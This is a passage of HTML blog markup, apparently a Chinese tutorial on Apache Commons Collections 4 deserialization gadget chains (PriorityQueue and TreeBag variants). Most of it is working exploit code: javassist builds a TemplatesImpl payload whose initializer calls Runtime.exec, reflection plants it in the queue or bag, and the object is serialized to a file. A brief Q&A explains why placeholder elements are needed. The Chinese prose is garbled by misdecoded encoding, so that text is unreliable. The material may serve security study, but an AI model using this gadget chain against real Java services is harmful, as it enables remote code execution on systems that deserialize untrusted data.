</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>queue</span><span class=o>[</span><span class=n>i</span><span class=o>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>s</span><span class=p>.</span><span class=na>readObject</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// Elements are guaranteed to be in &#34;proper order&#34;, but the</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// spec has never explained what that might be.</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>heapify</span><span class=p>();</span><span class=c1>//4</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>é˜…è¯»æºç å¯çŸ¥PriorityQueueåœ¨ååºåˆ—åŒ–readObjectæ—¶ï¼Œä¼šæŒ‰ç…§æ³¨é‡Šä¸­4ã€3ã€2ã€1æ ‡æ³¨çš„é¡ºåºï¼Œç»´æŠ¤ä¸€ä¸ªæ¡¶æ’åºæ ‘åˆæ³•ã€‚</p><p>æ¥ä¸‹æ¥å°±æ˜¯è¦å¦‚ä½•æ„é€ comparatorå’Œqueueäº†ã€‚</p><p>æ ¹æ®æ³¨é‡Š1å¤„ï¼Œæˆ‘ä»¬çŸ¥é“comparatoråº”è¯¥æ˜¯TransformingComparatorçš„ä¸€ä¸ªå®ä¾‹ã€‚</p><p>æ ¹æ®TemplatesImplå’ŒInvokerTransformerçš„åˆ†æï¼Œæˆ‘ä»¬çŸ¥é“queueåº”è¯¥æ˜¯TemplatesImplå®ä¾‹æ•°ç»„ã€‚</p><p>äºæ˜¯æœ‰Expä¸­çš„æ„é€ ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=n>InvokerTransformer</span><span class=w> </span><span class=n>transformer</span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=n>InvokerTransformer</span><span class=p>(</span><span class=s>&#34;newTransformer&#34;</span><span class=p>,</span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=p>{},</span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=p>{});</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>TransformingComparator</span><span class=w> </span><span class=n>comparator</span><span class=w> </span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=n>TransformingComparator</span><span class=p>(</span><span class=n>transformer</span><span class=p>);</span><span class=c1>//ä½¿ç”¨TransformingComparatorä¿®é¥°å™¨ä¼ å…¥transformerå¯¹è±¡</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>PriorityQueue</span><span class=w> </span><span class=n>queue</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>PriorityQueue</span><span class=p>(</span><span class=n>2</span><span class=p>);</span><span class=c1>//ä½¿ç”¨æŒ‡å®šçš„åˆå§‹å®¹é‡åˆ›å»ºä¸€ä¸ª PriorityQueueï¼Œå¹¶æ ¹æ®å…¶è‡ªç„¶é¡ºåºå¯¹å…ƒç´ è¿›è¡Œæ’åºã€‚</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>queue</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=n>1</span><span class=p>);</span><span class=c1>//</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>queue</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=n>2</span><span class=p>);</span><span class=c1>//å ä½ç”¨</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>Field</span><span class=w> </span><span class=n>field2</span><span class=o>=</span><span class=n>queue</span><span class=p>.</span><span class=na>getClass</span><span class=p>().</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=s>&#34;comparator&#34;</span><span class=p>);</span><span class=c1>//è·å–PriorityQueueçš„comparatorå­—æ®µ</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>field2</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=c1>//æš´åŠ›åå°„</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>field2</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=n>queue</span><span class=p>,</span><span class=n>comparator</span><span class=p>);</span><span class=c1>//è®¾ç½®queueçš„comparatorå­—æ®µå€¼ä¸ºcomparator</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>Field</span><span class=w> </span><span class=n>field3</span><span class=o>=</span><span class=n>queue</span><span class=p>.</span><span class=na>getClass</span><span class=p>().</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=s>&#34;queue&#34;</span><span class=p>);</span><span class=c1>//è·å–queueçš„queueå­—æ®µ</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>field3</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=c1>//æš´åŠ›åå°„</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>field3</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=n>queue</span><span class=p>,</span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=p>{</span><span class=n>templatesImpl</span><span class=p>,</span><span class=n>templatesImpl</span><span class=p>});</span><span class=c1>//è®¾ç½®queueçš„queueå­—æ®µå†…å®¹Objectæ•°ç»„ï¼Œå†…å®¹ä¸ºtemplatesImpl</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h4 id=é—®é¢˜è¡¥å……>é—®é¢˜è¡¥å……</h4><h5 id=queueå ä½>queueå ä½</h5><p>Q1ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=n>PriorityQueue</span><span class=w> </span><span class=n>queue</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>PriorityQueue</span><span class=p>(</span><span class=n>2</span><span class=p>);</span><span class=c1>//ä½¿ç”¨æŒ‡å®šçš„åˆå§‹å®¹é‡åˆ›å»ºä¸€ä¸ª PriorityQueueï¼Œå¹¶æ ¹æ®å…¶è‡ªç„¶é¡ºåºå¯¹å…ƒç´ è¿›è¡Œæ’åºã€‚</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>queue</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=n>1</span><span class=p>);</span><span class=c1>//1</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>queue</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=n>2</span><span class=p>);</span><span class=c1>//2</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>æ³¨é‡Š1ã€2å¤„ï¼Œä¸ºä½•éœ€è¦è¿™ä¸¤è¡Œä»£ç ï¼Ÿ</p><p>A1ï¼š</p><p>æˆ‘ä»¬çœ‹PriorityQueueçš„readObjectå‡½æ•°ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>readObject</span><span class=p>(</span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>ObjectInputStream</span><span class=w> </span><span class=n>s</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>throws</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>IOException</span><span class=p>,</span><span class=w> </span><span class=n>ClassNotFoundException</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// Read in size, and any hidden stuff</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>s</span><span class=p>.</span><span class=na>defaultReadObject</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// Read in (and discard) array length</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>s</span><span class=p>.</span><span class=na>readInt</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>SharedSecrets</span><span class=p>.</span><span class=na>getJavaOISAccess</span><span class=p>().</span><span class=na>checkArray</span><span class=p>(</span><span class=n>s</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=n>size</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>queue</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[</span><span class=n>size</span><span class=o>]</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// Read in all elements.</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>size</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>queue</span><span class=o>[</span><span class=n>i</span><span class=o>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>s</span><span class=p>.</span><span class=na>readObject</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// Elements are guaranteed to be in &#34;proper order&#34;, but the</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// spec has never explained what that might be.</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>heapify</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>è‹¥æ— è¿™ä¸¤è¡Œä»£ç ï¼Œåˆ™åˆ›å»ºçš„queueçš„sizeå±æ€§ä¸º0ã€‚</p><p>è¿™ä¼šå¯¼è‡´ååºåˆ—åŒ–æ—¶queueä¸ºç©ºã€‚</p><p>å› æ­¤Expä¹Ÿå¯ä»¥æ”¹ä¸ºï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=n>PriorityQueue</span><span class=w> </span><span class=n>queue</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>PriorityQueue</span><span class=p>(</span><span class=n>2</span><span class=p>);</span><span class=c1>//ä½¿ç”¨æŒ‡å®šçš„åˆå§‹å®¹é‡åˆ›å»ºä¸€ä¸ª PriorityQueueï¼Œå¹¶æ ¹æ®å…¶è‡ªç„¶é¡ºåºå¯¹å…ƒç´ è¿›è¡Œæ’åºã€‚</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>Field</span><span class=w> </span><span class=n>field4</span><span class=o>=</span><span class=n>queue</span><span class=p>.</span><span class=na>getClass</span><span class=p>().</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=s>&#34;size&#34;</span><span class=p>);</span><span class=c1>//è·å–PriorityQueueçš„sizeå­—æ®µ</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>field4</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=c1>//æš´åŠ›åå°„</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>field4</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=n>queue</span><span class=p>,</span><span class=n>2</span><span class=p>);</span><span class=c1>//è®¾ç½®queueçš„comparatorå­—æ®µå€¼ä¸ºcomparator</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>Q2ï¼š</p><p>ä¸ºä½•è¦ç”¨1ã€2å ä½ï¼Œä¸èƒ½ç›´æ¥add<code>templatesImpl</code>â€‹ï¼Ÿ</p><p>A2:</p><p>å› ä¸ºä¼šæŠ¥é”™ï¼š</p><p>â€‹<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl cannot be cast to java.lang.Comparable</code>â€‹</p><p>è€Œåˆ©ç”¨åå°„æ—¶</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=n>Field</span><span class=w> </span><span class=n>field3</span><span class=o>=</span><span class=n>queue</span><span class=p>.</span><span class=na>getClass</span><span class=p>().</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=s>&#34;queue&#34;</span><span class=p>);</span><span class=c1>//è·å–queueçš„queueå­—æ®µ</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>field3</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=c1>//æš´åŠ›åå°„</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>field3</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=n>queue</span><span class=p>,</span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=p>{</span><span class=n>templatesImpl</span><span class=p>,</span><span class=n>templatesImpl</span><span class=p>});</span><span class=c1>//è®¾ç½®queueçš„queueå­—æ®µå†…å®¹Objectæ•°ç»„ï¼Œå†…å®¹ä¸ºtemplatesImpl</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>Javaå¹¶ä¸ä¼šæ£€æŸ¥æ˜¯å¦åˆæ³•ï¼Œè€Œåœ¨ååºåˆ—åŒ–æ—¶ï¼Œç”±äºpayloadæ‰§è¡Œæ—©äºæ’åºï¼Œå› æ­¤ä¸å½±å“ã€‚</p><h5 id=quenueååºåˆ—åŒ–>quenueååºåˆ—åŒ–</h5><p>Qï¼š</p><p>PriorityQueueçš„queueå·²ç»ä½¿ç”¨transientå…³é”®å­—ä¿®é¥°ï¼Œä¸ºä»€ä¹ˆè¿˜èƒ½ä»æµä¸­ååºåˆ—åŒ–queueä¸­çš„å…ƒç´ ï¼Ÿ</p><p>Aï¼š</p><p><a class=link href=https://docs.oracle.com/javase/8/docs/platform/serialization/spec/output.html#a861 title=åºåˆ—åŒ–è§„èŒƒ target=_blank rel=noopener>åºåˆ—åŒ–è§„èŒƒ</a>å…è®¸å¾…åºåˆ—åŒ–çš„ç±»å®ç°writeObjectæ–¹æ³•ï¼Œå®ç°å¯¹è‡ªå·±çš„æˆå‘˜æ§åˆ¶æƒã€‚</p><h3 id=treebagtreemapé“¾>TreeBag&amp;TreeMapé“¾</h3><h4 id=expå±•ç¤º-2>Expå±•ç¤º</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>javassist.ClassPool</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>javassist.CtClass</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections4.bag.TreeBag</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections4.comparators.TransformingComparator</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections4.functors.InvokerTransformer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.io.FileInputStream</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.io.FileOutputStream</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.io.ObjectInputStream</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.io.ObjectOutputStream</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.Field</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.util.PriorityQueue</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>CommonsCollections2T</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>AbstractTranslet</span><span class=o>=</span><span class=s>&#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>TemplatesImpl</span><span class=o>=</span><span class=s>&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ClassPool</span><span class=w> </span><span class=n>classPool</span><span class=o>=</span><span class=n>ClassPool</span><span class=p>.</span><span class=na>getDefault</span><span class=p>();</span><span class=c1>//è¿”å›é»˜è®¤çš„ç±»æ± </span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>classPool</span><span class=p>.</span><span class=na>appendClassPath</span><span class=p>(</span><span class=n>AbstractTranslet</span><span class=p>);</span><span class=c1>//æ·»åŠ AbstractTransletçš„æœç´¢è·¯å¾„</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>CtClass</span><span class=w> </span><span class=n>payload</span><span class=o>=</span><span class=n>classPool</span><span class=p>.</span><span class=na>makeClass</span><span class=p>(</span><span class=s>&#34;CommonsCollections22222222222&#34;</span><span class=p>);</span><span class=c1>//åˆ›å»ºä¸€ä¸ªæ–°çš„publicç±»</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>payload</span><span class=p>.</span><span class=na>setSuperclass</span><span class=p>(</span><span class=n>classPool</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=n>AbstractTranslet</span><span class=p>));</span><span class=w>  </span><span class=c1>//è®¾ç½®å‰é¢åˆ›å»ºçš„CommonsCollections22222222222ç±»çš„çˆ¶ç±»ä¸ºAbstractTranslet</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>payload</span><span class=p>.</span><span class=na>makeClassInitializer</span><span class=p>().</span><span class=na>setBody</span><span class=p>(</span><span class=s>&#34;java.lang.Runtime.getRuntime().exec(\&#34;calc\&#34;);&#34;</span><span class=p>);</span><span class=w> </span><span class=c1>//åˆ›å»ºä¸€ä¸ªç©ºçš„ç±»åˆå§‹åŒ–ï¼Œè®¾ç½®æ„é€ å‡½æ•°ä¸»ä½“ä¸ºruntime</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>bytes</span><span class=o>=</span><span class=n>payload</span><span class=p>.</span><span class=na>toBytecode</span><span class=p>();</span><span class=c1>//è½¬æ¢ä¸ºbyteæ•°ç»„</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Object</span><span class=w> </span><span class=n>templatesImpl</span><span class=o>=</span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=n>TemplatesImpl</span><span class=p>).</span><span class=na>getDeclaredConstructor</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=p>{}).</span><span class=na>newInstance</span><span class=p>();</span><span class=c1>//åå°„åˆ›å»ºTemplatesImpl</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Field</span><span class=w> </span><span class=n>field</span><span class=o>=</span><span class=n>templatesImpl</span><span class=p>.</span><span class=na>getClass</span><span class=p>().</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=s>&#34;_bytecodes&#34;</span><span class=p>);</span><span class=c1>//åå°„è·å–templatesImplçš„_bytecodeså­—æ®µ</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>field</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=c1>//æš´åŠ›åå°„</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>field</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=n>templatesImpl</span><span class=p>,</span><span class=k>new</span><span class=w> </span><span class=kt>byte</span><span class=o>[][]</span><span class=p>{</span><span class=n>bytes</span><span class=p>});</span><span class=c1>//å°†templatesImplä¸Šçš„_bytecodeså­—æ®µè®¾ç½®ä¸ºruntimeçš„byteæ•°ç»„</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Field</span><span class=w> </span><span class=n>field1</span><span class=o>=</span><span class=n>templatesImpl</span><span class=p>.</span><span class=na>getClass</span><span class=p>().</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=s>&#34;_name&#34;</span><span class=p>);</span><span class=c1>//åå°„è·å–templatesImplçš„_nameå­—æ®µ</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>field1</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=c1>//æš´åŠ›åå°„</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>field1</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=n>templatesImpl</span><span class=p>,</span><span class=s>&#34;test&#34;</span><span class=p>);</span><span class=c1>//å°†templatesImplä¸Šçš„_nameå­—æ®µè®¾ç½®ä¸ºtest</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>InvokerTransformer</span><span class=w> </span><span class=n>transformer</span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=n>InvokerTransformer</span><span class=p>(</span><span class=s>&#34;toString&#34;</span><span class=p>,</span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=p>{},</span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=p>{});</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>TransformingComparator</span><span class=w> </span><span class=n>comparator</span><span class=w> </span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=n>TransformingComparator</span><span class=p>(</span><span class=n>transformer</span><span class=p>);</span><span class=c1>//ä½¿ç”¨TransformingComparatorä¿®é¥°å™¨ä¼ å…¥transformerå¯¹è±¡</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>TreeBag</span><span class=w> </span><span class=n>tb</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>TreeBag</span><span class=p>(</span><span class=n>comparator</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>tb</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=n>templatesImpl</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Field</span><span class=w> </span><span class=n>field2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>InvokerTransformer</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=s>&#34;iMethodName&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>field2</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>field2</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=n>transformer</span><span class=p>,</span><span class=w> </span><span class=s>&#34;newTransformer&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ObjectOutputStream</span><span class=w> </span><span class=n>outputStream</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ObjectOutputStream</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>FileOutputStream</span><span class=p>(</span><span class=s>&#34;test.out&#34;</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>outputStream</span><span class=p>.</span><span class=na>writeObject</span><span class=p>(</span><span class=n>tb</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>outputStream</span><span class=p>.</span><span class=na>close</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
